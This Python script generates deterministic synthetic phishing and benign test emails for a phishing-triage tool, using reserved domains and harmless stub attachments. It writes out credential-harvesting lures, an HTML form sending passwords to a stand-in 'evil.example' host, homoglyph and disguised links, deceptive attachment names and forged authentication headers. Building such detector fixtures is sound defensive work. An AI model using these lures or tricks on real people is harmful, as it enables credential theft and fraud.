"""Generate the synthetic test emails in tests/fixtures/emails/ (and the demo samples).

Run ``uv run python scripts/generate_emails.py``. Output is deterministic (fixed dates,
Message-IDs and MIME boundaries), so the committed files can be checked for drift.

Every domain is reserved for documentation or testing (example.com/.net/.org/.edu and
the .example, .test and .invalid TLDs), every IP is from a documentation range
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, 2001:db8::/32), and no attachment is
real malware: "executables" are a few harmless bytes with the right magic number.
"""

from __future__ import annotations

import argparse
import base64
import io
import quopri
import zipfile
from email.header import Header
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures" / "emails"

CRLF = "\r\n"
RTLO = chr(0x202E)
CYRILLIC_A = chr(0x0430)

# --------------------------------------------------------------------------- helpers


def encoded_word(text: str, charset: str = "utf-8") -> str:
    return Header(text, charset).encode()


def b64(data: bytes) -> str:
    return base64.encodebytes(data).decode("ascii").replace("\n", CRLF).rstrip(CRLF)


def qp(text: str, charset: str = "utf-8") -> str:
    encoded = quopri.encodestring(text.replace("\n", CRLF).encode(charset)).decode("ascii")
    return encoded.replace("\r\n", "\n").replace("\n", CRLF)


def message(headers: list[tuple[str, str]], body: str) -> str:
    head = CRLF.join(f"{name}: {value}" for name, value in headers)
    return head + CRLF + CRLF + body


def part(headers: list[tuple[str, str]], body: str) -> str:
    return message(headers, body)


def multipart(boundary: str, parts: list[str], preamble: str = "") -> str:
    chunks = [preamble] if preamble else []
    for p in parts:
        chunks.append(f"--{boundary}{CRLF}{p}")
    return (CRLF.join(chunks) if chunks else "") + f"{CRLF}--{boundary}--{CRLF}"


def received(frm: str, ip: str, by: str, when: str, rid: str, rcpt: str) -> tuple[str, str]:
    return (
        "Received",
        f"from {frm} ({frm} [{ip}]){CRLF}\tby {by} (Postfix) with ESMTPS id {rid}"
        f"{CRLF}\tfor <{rcpt}>; {when}",
    )


def our_mx(frm: str, ip: str, when: str, rid: str, rcpt: str = "alice@example.edu") -> tuple:
    return received(frm, ip, "mx.example.edu", when, rid, rcpt)


def auth(spf: str, dkim: str, dmarc: str, mailfrom: str, header_from: str) -> tuple[str, str]:
    return (
        "Authentication-Results",
        f"mx.example.edu;{CRLF}\tspf={spf} smtp.mailfrom={mailfrom};{CRLF}"
        f"\tdkim={dkim} header.d={header_from};{CRLF}\tdmarc={dmarc} header.from={header_from}",
    )


def text_part(text: str, charset: str = "utf-8", cte: str = "quoted-printable") -> str:
    body = qp(text, charset) if cte == "quoted-printable" else b64(text.encode(charset))
    return part(
        [("Content-Type", f'text/plain; charset="{charset}"'), ("Content-Transfer-Encoding", cte)],
        body,
    )


def html_part(html: str, cte: str = "base64") -> str:
    body = b64(html.encode("utf-8")) if cte == "base64" else qp(html)
    return part(
        [("Content-Type", 'text/html; charset="utf-8"'), ("Content-Transfer-Encoding", cte)],
        body,
    )


def file_part(filename: str, ctype: str, data: bytes) -> str:
    return part(
        [
            ("Content-Type", f'{ctype}; name="{filename}"'),
            ("Content-Disposition", f'attachment; filename="{filename}"'),
            ("Content-Transfer-Encoding", "base64"),
        ],
        b64(data),
    )


def rfc822_part(raw: str, filename: str = "Suspicious message.eml") -> str:
    return part(
        [
            ("Content-Type", f'message/rfc822; name="{filename}"'),
            ("Content-Disposition", f'attachment; filename="{filename}"'),
        ],
        raw,
    )


def report_wrapper(original: str | list[str], *, as_octet_stream: bool = False, n: int) -> str:
    """What an employee's "Forward as attachment" to the report mailbox looks like."""
    originals = original if isinstance(original, list) else [original]
    attached = []
    for i, raw in enumerate(originals):
        if as_octet_stream:
            attached.append(
                file_part(f"message-{i + 1}.eml", "application/octet-stream", raw.encode("utf-8"))
            )
        else:
            attached.append(rfc822_part(raw, f"Suspicious message {i + 1}.eml"))
    boundary = f"report-{n}"
    return message(
        [
            our_mx(
                "smtp-int.example.edu",
                "10.20.0.5",
                "Tue, 24 Nov 2026 10:15:02 +0000",
                f"R{n}A",
                "report-phishing@example.edu",
            ),
            (
                "Authentication-Results",
                "mx.example.edu; spf=pass smtp.mailfrom=example.edu;"
                " dkim=pass header.d=example.edu; dmarc=pass header.from=example.edu",
            ),
            ("From", "Bob Reporter <bob@example.edu>"),
            ("To", "report-phishing@example.edu"),
            ("Subject", "Fwd: is this phishing?"),
            ("Date", "Tue, 24 Nov 2026 10:15:00 +0000"),
            ("Message-ID", f"<report-{n}@example.edu>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", f'multipart/mixed; boundary="{boundary}"'),
        ],
        multipart(boundary, [text_part("Hi, this looks odd to me. - Bob"), *attached]),
    )


def zip_bytes(members: dict[str, bytes], *, encrypt_flag: bool = False) -> bytes:
    """A small ZIP. ``encrypt_flag`` sets the "encrypted" bit, like a password-protected
    archive; the contents are not actually encrypted (and are never extracted anyway)."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in members.items():
            info = zipfile.ZipInfo(name, date_time=(2026, 11, 24, 9, 0, 0))
            archive.writestr(info, data)
    raw = bytearray(buffer.getvalue())
    if encrypt_flag:
        # Set bit 0 of the general-purpose flag in every local and central header.
        for signature, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            start = 0
            while (pos := raw.find(signature, start)) != -1:
                raw[pos + offset] |= 0x01
                start = pos + 4
    return bytes(raw)


FAKE_PE = b"MZ" + b"\x90\x00" + b"\x00" * 56 + b"This is a harmless PhishTriage test file.\x00"
FAKE_LNK = (
    b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    + b"\x00" * 56
)
FAKE_PDF = b"%PDF-1.4\n% PhishTriage harmless test document\n%%EOF\n"


# --------------------------------------------------------------------------- the emails


def credential_phish_qp() -> str:
    """Display-name spoof + lookalike domain + credential request, quoted-printable."""
    body = (
        "Dear user,\n\n"
        "We detected unusual sign-in activity on your Example University account.\n"
        "Your account will be suspended within 24 hours unless you verify your password\n"
        "at the secure portal below:\n\n"
        "https://examp1e.example/sso/login?user=alice\n\n"
        "Thank you,\nIT Service Desk\n"
    )
    return message(
        [
            our_mx(
                "mail.examp1e.example", "203.0.113.10", "Tue, 24 Nov 2026 09:58:01 +0000", "4Xq1"
            ),
            received(
                "[192.0.2.44]",
                "192.0.2.44",
                "mail.examp1e.example",
                "Tue, 24 Nov 2026 09:57:58 +0000",
                "1a2b",
                "alice@example.edu",
            ),
            auth("fail", "none", "none", "examp1e.example", "examp1e.example"),
            ("From", "IT Service Desk <it-support@examp1e.example>"),
            ("To", "Alice <alice@example.edu>"),
            ("Subject", "Action required: verify your account"),
            ("Date", "Tue, 24 Nov 2026 09:57:55 +0000"),
            ("Message-ID", "<cred-01@examp1e.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/plain; charset="utf-8"'),
            ("Content-Transfer-Encoding", "quoted-printable"),
        ],
        qp(body),
    )


def html_link_mismatch_b64() -> str:
    """Spoofed own domain (DMARC fail), link text/href mismatch, credential form."""
    html = (
        "<html><head><style>p{font-family:Arial}</style></head><body>"
        "<p>Dear student,</p><p>Your mailbox is over quota. Sign in to keep receiving mail:</p>"
        '<p><a href="https://account-verify.evil.example/owa/login">'
        "https://www.example.edu/account</a></p>"
        '<form action="https://collect.evil.example/post" method="post">'
        '<input type="text" name="user"><input type="password" name="pass">'
        '<input type="submit" value="Sign in"></form>'
        '<img src="https://track.evil.example/open.gif?id=42" width="1" height="1">'
        "<p>Example University IT</p></body></html>"
    )
    boundary = "alt-02"
    return message(
        [
            our_mx("smtp.evil.example", "198.51.100.23", "Tue, 24 Nov 2026 08:12:44 +0000", "7Hh2"),
            auth("fail", "fail", "fail", "evil.example", "example.edu"),
            ("From", "Example University <noreply@example.edu>"),
            ("Reply-To", "helpdesk@evil.example"),
            ("To", "students@example.edu"),
            ("Subject", "Mailbox quota exceeded"),
            ("Date", "Tue, 24 Nov 2026 08:12:40 +0000"),
            ("Message-ID", "<quota-02@evil.example>"),
            ("Return-Path", "<bounce@evil.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", f'multipart/alternative; boundary="{boundary}"'),
        ],
        multipart(
            boundary,
            [
                text_part("Your mailbox is over quota. Sign in: https://www.example.edu/account"),
                html_part(html),
            ],
        ),
    )


def gbk_chinese() -> str:
    """Chinese phish labelled gb2312 but containing GBK-only characters (镕)."""
    text = (
        "尊敬的用户：\n\n您的邮箱账户将被停用。请在24小时内点击下面的链接验证密码，"
        "否则账户将被冻结。\n\nhttp://203.0.113.50/verify/镕\n\n邮件系统管理员\n"
    )
    return message(
        [
            our_mx(
                "mail.notice.example", "203.0.113.50", "Mon, 23 Nov 2026 23:01:10 +0800", "9Cn3"
            ),
            auth("softfail", "none", "none", "notice.example", "notice.example"),
            ("From", f"{encoded_word('邮件系统管理员', 'gb2312')} <admin@notice.example>"),
            ("To", "alice@example.edu"),
            ("Subject", encoded_word("紧急：您的邮箱即将停用", "gb2312")),
            ("Date", "Mon, 23 Nov 2026 23:01:05 +0800"),
            ("Message-ID", "<gbk-03@notice.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/plain; charset="gb2312"'),
            ("Content-Transfer-Encoding", "base64"),
        ],
        b64(text.replace("\n", CRLF).encode("gbk")),
    )


def iso2022jp_newsletter() -> str:
    """Benign Japanese newsletter in ISO-2022-JP (7bit), authenticated."""
    text = (
        "いつもご利用ありがとうございます。\n今月のお知らせです。\nhttps://www.example.net/news\n"
    )
    return message(
        [
            our_mx(
                "mailer.example.net", "198.51.100.80", "Tue, 24 Nov 2026 01:00:05 +0000", "2Jp4"
            ),
            auth("pass", "pass", "pass", "example.net", "example.net"),
            ("From", f"{encoded_word('お知らせ', 'iso-2022-jp')} <news@example.net>"),
            ("To", "alice@example.edu"),
            ("Subject", encoded_word("今月のお知らせ", "iso-2022-jp")),
            ("Date", "Tue, 24 Nov 2026 01:00:00 +0000"),
            ("Message-ID", "<jp-04@example.net>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/plain; charset="iso-2022-jp"'),
            ("Content-Transfer-Encoding", "7bit"),
        ],
        text.replace("\n", CRLF).encode("iso-2022-jp").decode("ascii"),
    )


def malformed_headers() -> str:
    """Broken headers everywhere; the parser must survive and record defects."""
    return (
        "Received: garbage without structure"
        + CRLF
        + 'From: "Unclosed Quote <weird@example.com'
        + CRLF
        + "To: undisclosed-recipients:;"
        + CRLF
        + "Subject: =?utf-8?B?not-valid-base64!!?= hello"
        + CRLF
        + "Subject: duplicate subject header"
        + CRLF
        + "Date: Someday, 99 Foo 20XX 25:61:00"
        + CRLF
        + 'Content-Type: text/plain; charset="x-made-up-charset"'
        + CRLF
        + "This line has no colon, so the parser ends the headers here"
        + CRLF
        + CRLF
        + "Body with an unknown charset: caf\xe9"
        + CRLF
    )


def invoice_double_extension() -> str:
    """The original inside a report: fake invoice with invoice.pdf.exe."""
    boundary = "mixed-06"
    return message(
        [
            our_mx(
                "relay.billing.example", "203.0.113.77", "Tue, 24 Nov 2026 07:30:00 +0000", "5Inv"
            ),
            auth("pass", "none", "none", "billing.example", "billing.example"),
            ("From", "Accounts Payable <ap@billing.example>"),
            ("To", "alice@example.edu"),
            ("Subject", "Overdue invoice #20261124"),
            ("Date", "Tue, 24 Nov 2026 07:29:55 +0000"),
            ("Message-ID", "<inv-06@billing.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", f'multipart/mixed; boundary="{boundary}"'),
        ],
        multipart(
            boundary,
            [
                text_part("Please find the overdue invoice attached. Payment is due today."),
                file_part("invoice.pdf.exe", "application/octet-stream", FAKE_PE),
            ],
        ),
    )


def inline_forward() -> str:
    """Reporter used plain "Forward": original headers lost, Gmail-style marker."""
    body = (
        "Got this, is it legit?\n\n"
        "---------- Forwarded message ---------\n"
        "From: Parcel Service <noreply@parcel.example>\n"
        "Date: Mon, 23 Nov 2026 at 18:02\n"
        "Subject: Your parcel is on hold\n"
        "To: <bob@example.edu>\n\n"
        "Your parcel could not be delivered. Your account will be closed unless you confirm\n"
        "your password and pay the customs fee within 24 hours: https://short.example/p4rc3l\n"
    )
    return message(
        [
            our_mx(
                "smtp-int.example.edu",
                "10.20.0.5",
                "Tue, 24 Nov 2026 10:20:00 +0000",
                "R7A",
                "report-phishing@example.edu",
            ),
            (
                "Authentication-Results",
                "mx.example.edu; spf=pass smtp.mailfrom=example.edu;"
                " dkim=pass header.d=example.edu; dmarc=pass header.from=example.edu",
            ),
            ("From", "Bob Reporter <bob@example.edu>"),
            ("To", "report-phishing@example.edu"),
            ("Subject", "Fwd: Your parcel is on hold"),
            ("Date", "Tue, 24 Nov 2026 10:19:58 +0000"),
            ("Message-ID", "<fwd-07@example.edu>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/plain; charset="utf-8"'),
            ("Content-Transfer-Encoding", "quoted-printable"),
        ],
        qp(body),
    )


def benign_internal() -> str:
    """Authenticated internal announcement; links only to our own domain."""
    return message(
        [
            our_mx("smtp-int.example.edu", "10.20.0.7", "Tue, 24 Nov 2026 06:00:01 +0000", "3Int"),
            auth("pass", "pass", "pass", "example.edu", "example.edu"),
            ("From", "Library <library@example.edu>"),
            ("To", "all-staff@example.edu"),
            ("Subject", "Library opening hours over the holidays"),
            ("Date", "Tue, 24 Nov 2026 06:00:00 +0000"),
            ("Message-ID", "<lib-08@example.edu>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/plain; charset="utf-8"'),
            ("Content-Transfer-Encoding", "7bit"),
        ],
        "The library closes early on 24 December. Details: https://www.example.edu/library" + CRLF,
    )


def payment_advice_html() -> str:
    """HTML attachment plus a punycode (homoglyph) link."""
    attachment = (
        b"<html><body><script>window.location='https://pay.evil.example/'</script>"
        b"Loading payment advice...</body></html>"
    )
    boundary = "mixed-09"
    return message(
        [
            our_mx(
                "out.vendor.example", "198.51.100.99", "Tue, 24 Nov 2026 05:45:00 +0000", "6Pay"
            ),
            auth("pass", "pass", "pass", "vendor.example", "vendor.example"),
            ("From", "Vendor Payments <payments@vendor.example>"),
            ("To", "alice@example.edu"),
            ("Subject", "Payment advice"),
            ("Date", "Tue, 24 Nov 2026 05:44:58 +0000"),
            ("Message-ID", "<pay-09@vendor.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", f'multipart/mixed; boundary="{boundary}"'),
        ],
        multipart(
            boundary,
            [
                text_part(
                    "Remittance details are attached. Portal: https://xn--pypal-4ve.example/remit"
                ),
                file_part("Payment_Advice.html", "text/html", attachment),
            ],
        ),
    )


def attachments_zoo() -> str:
    """Encrypted ZIP (with an executable inside), a shortcut, a macro-enabled document
    name, a right-to-left-override file name, and a PDF that is really an executable."""
    rtlo_name = f"photo{RTLO}gpj.exe"
    boundary = "mixed-10"
    return message(
        [
            our_mx("mx1.files.example", "203.0.113.120", "Tue, 24 Nov 2026 04:10:00 +0000", "8Zoo"),
            auth("pass", "none", "none", "files.example", "files.example"),
            ("From", "Scanner <scanner@files.example>"),
            ("To", "alice@example.edu"),
            ("Subject", "Scanned documents"),
            ("Date", "Tue, 24 Nov 2026 04:09:55 +0000"),
            ("Message-ID", "<zoo-10@files.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", f'multipart/mixed; boundary="{boundary}"'),
        ],
        multipart(
            boundary,
            [
                text_part("Your scanned documents are attached. Password for the archive: 2026"),
                file_part(
                    "documents.zip",
                    "application/zip",
                    zip_bytes({"scan001.pdf": FAKE_PDF, "scan002.exe": FAKE_PE}, encrypt_flag=True),
                ),
                file_part("Scan.lnk", "application/octet-stream", FAKE_LNK),
                file_part(
                    "Report.docm",
                    "application/vnd.ms-word.document.macroEnabled.12",
                    zip_bytes({"word/document.xml": b"<w:document/>"}),
                ),
                part(
                    [
                        ("Content-Type", "application/octet-stream"),
                        (
                            "Content-Disposition",
                            f"attachment; filename*=utf-8''{_rfc2231(rtlo_name)}",
                        ),
                        ("Content-Transfer-Encoding", "base64"),
                    ],
                    b64(FAKE_PE),
                ),
                file_part("statement.pdf", "application/pdf", FAKE_PE),
            ],
        ),
    )


def _rfc2231(value: str) -> str:
    from urllib.parse import quote

    return quote(value, safe="")


def punycode_ip_shortener() -> str:
    """Payroll impersonation from free webmail, Reply-To mismatch, odd links."""
    homoglyph_host = f"ex{CYRILLIC_A}mple.example"
    text = (
        "Hello,\n\nPayroll needs you to confirm your bank details before Friday or your salary\n"
        "payment will be delayed. Use one of these links:\n\n"
        f"http://{homoglyph_host}/payroll\n"
        "http://3405803786/payroll/form\n"
        "https://short.example/s4l4ry\n\n"
        "Payroll Office\n"
    )
    return message(
        [
            our_mx(
                "smtp.freemail.example", "192.0.2.200", "Tue, 24 Nov 2026 03:00:00 +0000", "1Pun"
            ),
            auth("pass", "pass", "pass", "freemail.example", "freemail.example"),
            ("From", "Payroll Office <payroll.office.2026@freemail.example>"),
            ("Reply-To", "Payroll <payroll-desk@reply.test>"),
            ("To", "alice@example.edu"),
            ("Subject", "Salary payment on hold"),
            ("Date", "Tue, 24 Nov 2026 02:59:58 +0000"),
            ("Message-ID", "<pay-11@freemail.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/plain; charset="utf-8"'),
            ("Content-Transfer-Encoding", "8bit"),
        ],
        text.replace("\n", CRLF),
    )


def benign_newsletter_html() -> str:
    """Ordinary external newsletter (HTML, authenticated)."""
    html = (
        "<html><body><h1>November digest</h1><p>Read the latest research news on "
        '<a href="https://www.example.org/news/november">www.example.org</a>.</p>'
        '<p><a href="https://www.example.org/unsubscribe?u=abc">Unsubscribe</a></p>'
        "</body></html>"
    )
    return message(
        [
            our_mx("mail.example.org", "198.51.100.40", "Tue, 24 Nov 2026 02:00:00 +0000", "2News"),
            auth("pass", "pass", "pass", "example.org", "example.org"),
            ("From", "Research Digest <digest@example.org>"),
            ("To", "alice@example.edu"),
            ("Subject", "November research digest"),
            ("Date", "Tue, 24 Nov 2026 01:59:59 +0000"),
            ("Message-ID", "<digest-12@example.org>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/html; charset="utf-8"'),
            ("Content-Transfer-Encoding", "quoted-printable"),
        ],
        qp(html),
    )


def forged_auth_results() -> str:
    """The sender added their own 'all pass' Authentication-Results; ours says nothing."""
    return message(
        [
            (
                "Authentication-Results",
                "mx.evil.example; spf=pass smtp.mailfrom=example.edu;"
                " dkim=pass header.d=example.edu; dmarc=pass header.from=example.edu",
            ),
            our_mx("relay.evil.example", "203.0.113.66", "Tue, 24 Nov 2026 00:30:00 +0000", "0Frg"),
            ("From", "Example University Helpdesk <helpdesk@helpdesk-example.test>"),
            ("To", "alice@example.edu"),
            ("Subject", "Password expiry notice"),
            ("Date", "Tue, 24 Nov 2026 00:29:55 +0000"),
            ("Message-ID", "<frg-13@relay.evil.example>"),
            ("MIME-Version", "1.0"),
            ("Content-Type", 'text/plain; charset="utf-8"'),
        ],
        "Your password expires today. Keep your current password here: "
        "https://helpdesk-example.test/keep" + CRLF,
    )


# --------------------------------------------------------------------------- the files


def fixtures() -> dict[str, str]:
    return {
        "01_credential_phish_qp.eml": credential_phish_qp(),
        "02_html_link_mismatch_b64.eml": html_link_mismatch_b64(),
        "03_gbk_chinese.eml": gbk_chinese(),
        "04_iso2022jp_newsletter.eml": iso2022jp_newsletter(),
        "05_malformed_headers.eml": malformed_headers(),
        "06_report_with_attached_original.eml": report_wrapper(invoice_double_extension(), n=6),
        "07_inline_forward.eml": inline_forward(),
        "08_report_two_originals.eml": report_wrapper(
            [benign_internal(), payment_advice_html()], n=8
        ),
        "09_attachments_zoo.eml": attachments_zoo(),
        "10_punycode_ip_shortener.eml": punycode_ip_shortener(),
        "11_benign_internal.eml": benign_internal(),
        "12_benign_newsletter_html.eml": benign_newsletter_html(),
        "13_report_octet_stream_original.eml": report_wrapper(
            credential_phish_qp(), as_octet_stream=True, n=13
        ),
        "14_forged_auth_results.eml": forged_auth_results(),
    }


def encode(text: str) -> bytes:
    # 8bit bodies (fixture 10) and Latin-1 bytes (fixture 05) must survive as-is.
    try:
        return text.encode("ascii")
    except UnicodeEncodeError:
        if "caf\xe9" in text:
            return text.encode("latin-1")
        return text.encode("utf-8")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--check", action="store_true", help="fail if files are out of date")
    args = parser.parse_args()
    FIXTURES.mkdir(parents=True, exist_ok=True)
    stale = []
    for name, text in fixtures().items():
        path = FIXTURES / name
        data = encode(text)
        if args.check:
            if not path.exists() or path.read_bytes() != data:
                stale.append(name)
            continue
        path.write_bytes(data)
        print(f"wrote {path.relative_to(ROOT)} ({len(data)} bytes)")
    if stale:
        raise SystemExit(f"out of date: {', '.join(stale)} (run scripts/generate_emails.py)")


if __name__ == "__main__":
    main()
